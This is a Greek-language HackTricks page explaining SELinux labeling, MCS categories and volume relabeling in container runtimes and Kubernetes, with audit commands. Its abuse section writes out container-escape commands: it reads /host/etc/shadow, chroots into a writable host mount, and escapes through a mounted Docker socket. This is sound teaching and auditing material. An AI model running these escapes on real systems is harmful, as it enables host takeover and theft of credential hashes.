# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το SELinux είναι ένα σύστημα **Mandatory Access Control βασισμένο σε labels**. Κάθε σχετική διεργασία και αντικείμενο μπορεί να έχει ένα security context, και η policy αποφασίζει ποια domains μπορούν να αλληλεπιδρούν με ποιους τύπους και με ποιον τρόπο. Σε containerized περιβάλλοντα, αυτό συνήθως σημαίνει ότι το runtime εκκινεί τη διεργασία του container μέσα σε ένα περιορισμένο container domain και εφαρμόζει labels στο περιεχόμενο του container με τους αντίστοιχους τύπους. Αν η policy λειτουργεί σωστά, η διεργασία μπορεί να διαβάζει και να γράφει τα στοιχεία στα οποία αναμένεται να έχει πρόσβαση βάσει του label της, ενώ η πρόσβαση σε άλλο περιεχόμενο του host απορρίπτεται, ακόμη και αν αυτό το περιεχόμενο γίνει ορατό μέσω ενός mount.

Αυτή είναι μία από τις ισχυρότερες protections στην πλευρά του host που είναι διαθέσιμες σε mainstream Linux container deployments. Είναι ιδιαίτερα σημαντική σε Fedora, RHEL, CentOS Stream, OpenShift και άλλα SELinux-centric ecosystems. Σε αυτά τα περιβάλλοντα, ένας reviewer που αγνοεί το SELinux συχνά θα παρανοήσει γιατί μια προφανής διαδρομή προς compromise του host στην πραγματικότητα αποκλείεται.

## AppArmor Vs SELinux

Η ευκολότερη διαφορά υψηλού επιπέδου είναι ότι το AppArmor είναι path-based, ενώ το SELinux είναι **label-based**. Αυτό έχει σημαντικές συνέπειες για την ασφάλεια των containers. Μια path-based policy μπορεί να συμπεριφέρεται διαφορετικά αν το ίδιο περιεχόμενο του host γίνει ορατό κάτω από μια μη αναμενόμενη διαδρομή mount. Μια label-based policy, αντίθετα, εξετάζει ποιο είναι το label του αντικειμένου και τι μπορεί να κάνει σε αυτό το process domain. Αυτό δεν καθιστά το SELinux απλό, αλλά το κάνει ανθεκτικό απέναντι σε μια κατηγορία υποθέσεων βασισμένων σε path tricks, τις οποίες οι defenders μερικές φορές κάνουν κατά λάθος σε AppArmor-based systems.

Επειδή το μοντέλο είναι προσανατολισμένο στα labels, ο χειρισμός των container volumes και οι αποφάσεις για relabeling είναι κρίσιμα για την ασφάλεια. Αν το runtime ή ο operator αλλάξει τα labels υπερβολικά ευρέως για να "κάνει τα mounts να λειτουργήσουν", το όριο της policy που υποτίθεται ότι περιορίζει το workload μπορεί να γίνει πολύ πιο αδύναμο από όσο προβλεπόταν.

## Εργαστήριο

Για να δείτε αν το SELinux είναι ενεργό στο host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Για να επιθεωρήσετε τις υπάρχουσες ετικέτες στον host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Για να συγκρίνετε μια κανονική εκτέλεση με μία όπου η επισήμανση είναι απενεργοποιημένη:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Σε έναν host με ενεργοποιημένο SELinux, αυτή είναι μια πολύ πρακτική επίδειξη, επειδή δείχνει τη διαφορά μεταξύ ενός workload που εκτελείται στο αναμενόμενο container domain και ενός workload από το οποίο έχει αφαιρεθεί αυτό το επίπεδο enforcement.

## Χρήση Runtime

Το Podman είναι ιδιαίτερα καλά ευθυγραμμισμένο με το SELinux σε συστήματα όπου το SELinux αποτελεί προεπιλογή της πλατφόρμας. Το rootless Podman σε συνδυασμό με το SELinux είναι ένα από τα ισχυρότερα mainstream container baselines, επειδή η διεργασία είναι ήδη unprivileged στην πλευρά του host και εξακολουθεί να περιορίζεται από πολιτική MAC. Το Docker μπορεί επίσης να χρησιμοποιεί SELinux όπου υποστηρίζεται, αν και οι administrators μερικές φορές το απενεργοποιούν για να παρακάμψουν προβλήματα με το volume labeling. Τα CRI-O και OpenShift βασίζονται σε μεγάλο βαθμό στο SELinux ως μέρος του μοντέλου απομόνωσης των containers. Το Kubernetes μπορεί επίσης να εκθέτει ρυθμίσεις που σχετίζονται με το SELinux, αλλά η αξία τους εξαρτάται προφανώς από το αν το OS του node υποστηρίζει και επιβάλλει πράγματι το SELinux.<sup>[[2]](#references)</sup>

Το επαναλαμβανόμενο συμπέρασμα είναι ότι το SELinux δεν είναι προαιρετική διακόσμηση. Στα ecosystems που έχουν σχεδιαστεί γύρω από αυτό, αποτελεί μέρος του αναμενόμενου security boundary. Για host-side policy enumeration, transition analysis και abuse των εργαλείων διαχείρισης του SELinux, δείτε τη [γενική σελίδα του SELinux](../../../interesting-files-permissions/selinux.md).

## Κατηγορίες MCS και Relabeling Volumes

Η απομόνωση των containers είναι συνήθως ένας συνδυασμός **type enforcement** και **Multi-Category Security (MCS)**. Δύο διεργασίες μπορεί να εκτελούνται και οι δύο ως `container_t`, αλλά να λαμβάνουν διαφορετικά levels, όπως `s0:c123,c456` και `s0:c321,c654`. Το ιδιωτικό περιεχόμενο του container έχει label `container_file_t` με τις αντίστοιχες κατηγορίες, επομένως η απλή πρόσβαση στο path ενός άλλου container δεν αρκεί για την πρόσβαση σε αυτό. Τα runtimes συνήθως εκχωρούν το ζεύγος κατηγοριών· η χειροκίνητη επαναχρησιμοποίηση ενός level καταργεί σκόπιμα αυτή την απομόνωση ανά container.<sup>[[3]](#references)</sup>

Συγκρίνετε τα process labels και τα mount labels αντί να ελέγχετε μόνο τον type:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Τα suffixes του bind-mount αλλάζουν τα labels των inode του host και επομένως αλλάζουν το security boundary, όχι μόνο τα metadata του mount:<sup>[[3]](#references)</sup>

- Το `:Z` εφαρμόζει ένα private label με τις MCS categories του container. Είναι κατάλληλο για ένα volume που ανήκει σε ένα container ή Pod.
- Το `:z` εφαρμόζει ένα shared label, ώστε και άλλα confined containers να μπορούν να χρησιμοποιούν το περιεχόμενο (με την επιφύλαξη των DAC permissions). Η χρήση του για secrets ή tenant-specific data καταργεί το MCS isolation που διαφορετικά θα διαχώριζε τα containers.
- Το relabeling είναι recursive. Η εφαρμογή οποιασδήποτε από τις δύο options σε broad host trees όπως τα `/`, `/etc`, `/usr` ή σε ολόκληρο το home tree μπορεί τόσο να εκθέσει περιεχόμενο στο επιλεγμένο container όσο και να σταματήσει host services των οποίων τα αναμενόμενα labels αντικαταστάθηκαν.

Η χειροκίνητη επαναχρησιμοποίηση level εντοπίζεται εύκολα σε command lines και manifests. Τα ακόλουθα δύο containers λαμβάνουν σκόπιμα το ίδιο MCS level και επομένως μπορούν να χρησιμοποιούν περιεχόμενο με label για αυτό το level:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Επίσης, ξεχωρίστε το `label=nested` από το `label=disable`: το πρώτο εκθέτει τις λειτουργίες SELinux μέσα στο container και επιτρέπει αλλαγές ετικετών μόνο όπου το επιτρέπει η policy, ενώ το δεύτερο καταργεί τον διαχωρισμό μέσω ετικετών για το συγκεκριμένο workload. Και τα δύο απαιτούν έλεγχο, αλλά δεν είναι ισοδύναμα.<sup>[[3]](#references)</sup>

## Λανθασμένες ρυθμίσεις

Το κλασικό λάθος είναι το `label=disable`. Σε λειτουργικό επίπεδο, αυτό συμβαίνει συχνά επειδή ένα volume mount απορρίφθηκε και η ταχύτερη βραχυπρόθεσμη λύση ήταν η αφαίρεση του SELinux από την εξίσωση, αντί για τη διόρθωση του μοντέλου labeling.<sup>[[1]](#references)</sup> Ένα ακόμη συνηθισμένο λάθος είναι το incorrect relabeling περιεχομένου του host. Οι ευρείες λειτουργίες relabel μπορεί να κάνουν την εφαρμογή να λειτουργεί, αλλά μπορούν επίσης να διευρύνουν σημαντικά το περιεχόμενο που επιτρέπεται να αγγίξει το container, πέρα από αυτό που είχε αρχικά προβλεφθεί.

Είναι επίσης σημαντικό να μη συγχέεται το **installed** SELinux με το **effective** SELinux. Ένας host μπορεί να υποστηρίζει SELinux και παρ' όλα αυτά να βρίσκεται σε permissive mode, ή το runtime μπορεί να μην εκκινεί το workload στο αναμενόμενο domain. Σε αυτές τις περιπτώσεις, η προστασία είναι πολύ πιο αδύναμη από όσο μπορεί να υποδηλώνει η τεκμηρίωση.

## Abuse

Όταν το SELinux απουσιάζει, βρίσκεται σε permissive mode ή είναι ευρέως απενεργοποιημένο για το workload, τα host-mounted paths γίνονται πολύ ευκολότερο να γίνουν αντικείμενο abuse. Το ίδιο bind mount που διαφορετικά θα περιοριζόταν από labels μπορεί να μετατραπεί σε άμεσο τρόπο πρόσβασης σε δεδομένα του host ή τροποποίησης του host. Αυτό είναι ιδιαίτερα σημαντικό όταν συνδυάζεται με writable volume mounts, container runtime directories ή operational shortcuts που εκθέτουν ευαίσθητα paths του host για λόγους ευκολίας.

Το SELinux συχνά εξηγεί γιατί ένα generic breakout writeup λειτουργεί αμέσως σε έναν host, αλλά αποτυγχάνει επανειλημμένα σε έναν άλλο, παρόλο που τα runtime flags φαίνονται παρόμοια. Το στοιχείο που λείπει συχνά δεν είναι καθόλου ένα namespace ή ένα capability, αλλά ένα label boundary που παρέμεινε ανέπαφο.

Ο ταχύτερος πρακτικός έλεγχος είναι να συγκρίνετε το active context και στη συνέχεια να εξετάσετε mounted host paths ή runtime directories που κανονικά θα περιορίζονταν μέσω labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Αν υπάρχει host bind mount και το SELinux labeling έχει απενεργοποιηθεί ή αποδυναμωθεί, συχνά προηγείται η αποκάλυψη πληροφοριών:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Εάν το mount είναι εγγράψιμο και το container είναι ουσιαστικά host-root από την άποψη του kernel, το επόμενο βήμα είναι να δοκιμάσετε μια ελεγχόμενη τροποποίηση του host αντί να κάνετε εικασίες:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Σε hosts με υποστήριξη SELinux, η απώλεια labels γύρω από directories κατάστασης runtime μπορεί επίσης να εκθέσει άμεσες διαδρομές privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Οι εντολές αυτές δεν αντικαθιστούν ένα πλήρες escape chain, αλλά δείχνουν πολύ γρήγορα αν το SELinux ήταν αυτό που εμπόδιζε την πρόσβαση σε δεδομένα του host ή την τροποποίηση αρχείων στην πλευρά του host.

### Πλήρες Παράδειγμα: SELinux Disabled + Writable Host Mount

Αν το SELinux labeling είναι απενεργοποιημένο και το filesystem του host έχει γίνει mount με δικαίωμα εγγραφής στο `/host`, ένα πλήρες host escape γίνεται μια κανονική περίπτωση abuse του bind mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Εάν το `chroot` ολοκληρωθεί με επιτυχία, η διεργασία του container λειτουργεί πλέον από το filesystem του host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Πλήρες παράδειγμα: SELinux απενεργοποιημένο + Κατάλογος Runtime

Εάν το workload μπορεί να αποκτήσει πρόσβαση σε ένα runtime socket μετά την απενεργοποίηση των labels, το escape μπορεί να ανατεθεί στο runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Η σχετική παρατήρηση είναι ότι το SELinux συχνά ήταν ο μηχανισμός ελέγχου που απέτρεπε ακριβώς αυτού του είδους την πρόσβαση σε host-path ή runtime-state.

## Έλεγχοι

Στόχος των ελέγχων του SELinux είναι να επιβεβαιωθεί ότι το SELinux είναι ενεργοποιημένο, να προσδιοριστεί το τρέχον security context και να διαπιστωθεί αν τα αρχεία ή τα paths που σας ενδιαφέρουν περιορίζονται πράγματι μέσω labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Τι είναι ενδιαφέρον εδώ:

- Το `getenforce` ιδανικά θα πρέπει να επιστρέφει `Enforcing`· τα `Permissive` ή `Disabled` αλλάζουν το νόημα ολόκληρης της ενότητας SELinux.
- Αν το context της τρέχουσας διεργασίας φαίνεται απρόσμενο ή υπερβολικά ευρύ, το workload μπορεί να μην εκτελείται σύμφωνα με την προβλεπόμενη πολιτική container.
- Αν τα labels των αρχείων που έχουν γίνει mount από τον host ή των runtime directories επιτρέπουν στη διεργασία υπερβολικά ελεύθερη πρόσβαση, τα bind mounts γίνονται πολύ πιο επικίνδυνα.

Κατά την αξιολόγηση ενός container σε πλατφόρμα που υποστηρίζει SELinux, μην αντιμετωπίζετε το labeling ως δευτερεύουσα λεπτομέρεια. Σε πολλές περιπτώσεις αποτελεί έναν από τους κύριους λόγους για τους οποίους ο host δεν έχει ήδη παραβιαστεί.

## Προεπιλογές Runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Εξαρτάται από τον host | Ο διαχωρισμός SELinux είναι διαθέσιμος σε hosts με ενεργοποιημένο SELinux, αλλά η ακριβής συμπεριφορά εξαρτάται από τη διαμόρφωση του host/daemon | `--security-opt label=disable`, ευρύ relabeling των bind mounts, `--privileged` |
| Podman | Συνήθως ενεργοποιημένο σε hosts με SELinux | Ο διαχωρισμός SELinux αποτελεί κανονικό μέρος του Podman σε συστήματα SELinux, εκτός αν απενεργοποιηθεί | `--security-opt label=disable`, `label=false` στο `containers.conf`, `--privileged` |
| Kubernetes | Ανατίθεται από το runtime σε nodes με SELinux· ρυθμίζεται ρητά | Το runtime μπορεί να εκχωρήσει ένα μοναδικό label όταν το Pod δεν ορίζει κάποιο. Το `securityContext.seLinuxOptions` ελέγχει ρητά το label του Pod/volume· στο Kubernetes 1.37, τα επιλέξιμα volumes χρησιμοποιούν από προεπιλογή SELinux mount labeling | διπλότυπα MCS levels, permissive/disabled nodes, ευρέως privileged workloads, αδιάκριτη χρήση του `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / αναπτύξεις τύπου OpenShift | Συνήθως χρησιμοποιείται εκτενώς | Το SELinux αποτελεί συχνά βασικό μέρος του μοντέλου απομόνωσης των nodes σε αυτά τα περιβάλλοντα | custom policies που διευρύνουν υπερβολικά την πρόσβαση, απενεργοποίηση του labeling για λόγους συμβατότητας |

Οι προεπιλογές του SELinux εξαρτώνται περισσότερο από τη διανομή σε σχέση με τις προεπιλογές του seccomp. Σε συστήματα τύπου Fedora/RHEL/OpenShift, το SELinux αποτελεί συχνά κεντρικό μέρος του μοντέλου απομόνωσης. Σε συστήματα χωρίς SELinux, απλώς απουσιάζει.

## Labeling Volumes στο Kubernetes 1.37

Το Kubernetes 1.37 κατέστησε το `SELinuxMount` stable και το ενεργοποίησε από προεπιλογή. Για ένα επιλέξιμο PVC, ένα Pod με `seLinuxOptions` και έναν CSI driver που δηλώνει `.spec.seLinuxMount: true`, το kubelet χρησιμοποιεί `-o context=<label>` αντί να ζητά από το runtime να κάνει recursively relabel κάθε inode. Οι drivers και οι τύποι volumes που δεν υποστηρίζονται εξακολουθούν να χρησιμοποιούν τη recursive διαδρομή. Αυτό αποφεύγει μια μεγάλη διαδικασία relabeling και επίσης αποφεύγει την αλλαγή των persistent labels κάθε αρχείου μόνο και μόνο για να εκτεθεί το volume σε ένα Pod.<sup>[[2]](#references)[[4]](#references)</sup>

Ένα mount μπορεί να φέρει μόνο ένα τέτοιο context. Κατά συνέπεια, Pods με **διαφορετικά SELinux labels** που χρησιμοποιούν το ίδιο επιλέξιμο volume στον ίδιο node δεν συνυπάρχουν πλέον υπό την προεπιλεγμένη συμπεριφορά `MountOption`: το ένα παραμένει σε `ContainerCreating` με σφάλμα `conflicting SELinux labels of volume`. Αντιμετωπίστε το τόσο ως ζήτημα διαθεσιμότητας όσο και ως χρήσιμη ένδειξη ότι τα workloads μοιράζονταν implicit storage μεταξύ διαφορετικών MCS boundaries. Αν αυτή η κοινή χρήση είναι σκόπιμη—για παράδειγμα, ένα privileged `spc_t` Pod και ένα confined Pod που χρησιμοποιούν το ίδιο volume—το per-Pod compatibility escape hatch είναι το `seLinuxChangePolicy: Recursive`· μην το εφαρμόσετε σε ολόκληρο το cluster χωρίς να κατανοήσετε ποια paths θα κάνει relabel το runtime.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Χρήσιμοι έλεγχοι από την πλευρά του cluster:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Το προαιρετικό `selinux-warning-controller` του `kube-controller-manager` εντοπίζει Pods που μοιράζονται έναν τόμο με ασύμβατες ετικέτες και εκθέτει το metric `selinux_warning_controller_selinux_volume_conflict`. Ενεργοποιήστε το και ελέγξτε το πριν από upgrades ή πριν αλλάξετε τη συμπεριφορά των volume labels· βοηθά να διακρίνετε μια πραγματική διένεξη policy από μια συνηθισμένη αποτυχία CSI ή filesystem.<sup>[[2]](#references)</sup>

## References

- [1] [Τεκμηρίωση Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Διαμόρφωση Security Context για Pod ή Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Τεκμηρίωση Podman run: SELinux labels και relabeling volumes](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 release: SELinuxMount και SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
